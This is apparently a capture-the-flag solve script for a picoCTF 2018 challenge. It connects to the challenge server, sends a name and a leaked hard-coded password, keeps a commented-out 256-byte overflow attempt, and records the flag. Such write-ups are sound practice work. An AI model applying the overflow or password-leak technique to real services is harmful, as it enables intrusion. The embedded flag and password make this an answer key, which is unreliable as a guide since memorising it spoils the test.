import socket
import struct

HOST = "2018shell3.picoctf.com"
PORT = 23685

def pack(p):
    return struct.pack('<I', p)


#name = b'A'*256 + b'\n'
#password = b'\nPlease Enter the Password.\n'

name = b"AnyName\n"
password = b'a_reAllY_s3cuRe_p4s$word_a28d9d\n'

#flag: picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_ee6111c9}

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(sock.recv(1024))
    sock.sendall(name)
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.sendall(password)
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.close()

main()